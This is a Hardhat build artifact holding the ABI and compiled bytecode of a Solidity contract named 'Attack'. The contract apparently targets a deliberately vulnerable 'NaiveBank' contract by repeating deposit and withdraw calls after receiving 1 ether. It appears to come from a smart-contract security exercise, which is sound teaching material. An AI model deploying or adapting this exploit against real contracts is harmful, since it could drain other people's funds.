{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract INaiveBank",
          "name": "_naiveBank",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_xTimes",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "naiveBank",
      "outputs": [
        {
          "internalType": "contract INaiveBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b50604051610671380380610671833981810160405281019061003291906100e1565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250505061010e565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009c82610071565b9050919050565b60006100ae82610091565b9050919050565b6100be816100a3565b81146100c957600080fd5b50565b6000815190506100db816100b5565b92915050565b6000602082840312156100f7576100f661006c565b5b6000610105848285016100cc565b91505092915050565b60805161053461013d6000396000818160e30152818161016401528181610203015261028701526105346000f3fe60806040526004361061002d5760003560e01c806364dd891a14610039578063d57b2f671461005557610034565b3661003457005b600080fd5b610053600480360381019061004e91906102e4565b610080565b005b34801561006157600080fd5b5061006a610285565b6040516100779190610390565b60405180910390f35b670de0b6b3a764000034146100ca576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100c190610408565b60405180910390fd5b60005b6001826100da9190610457565b811015610200577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561014957600080fd5b505af115801561015d573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016101bb919061049a565b600060405180830381600087803b1580156101d557600080fd5b505af11580156101e9573d6000803e3d6000fd5b5050505080806101f8906104b5565b9150506100cd565b507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026957600080fd5b505af115801561027d573d6000803e3d6000fd5b505050505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b600080fd5b6000819050919050565b6102c1816102ae565b81146102cc57600080fd5b50565b6000813590506102de816102b8565b92915050565b6000602082840312156102fa576102f96102a9565b5b6000610308848285016102cf565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061035661035161034c84610311565b610331565b610311565b9050919050565b60006103688261033b565b9050919050565b600061037a8261035d565b9050919050565b61038a8161036f565b82525050565b60006020820190506103a56000830184610381565b92915050565b600082825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b00000000000000600082015250565b60006103f26019836103ab565b91506103fd826103bc565b602082019050919050565b60006020820190508181036000830152610421816103e5565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610462826102ae565b915061046d836102ae565b9250828210156104805761047f610428565b5b828203905092915050565b610494816102ae565b82525050565b60006020820190506104af600083018461048b565b92915050565b60006104c0826102ae565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156104f3576104f2610428565b5b60018201905091905056fea26469706673582212202061e8aeb203515f58fd9886a7e5e5461009092aea3e92775d69bf2658e2c6ce64736f6c63430008090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}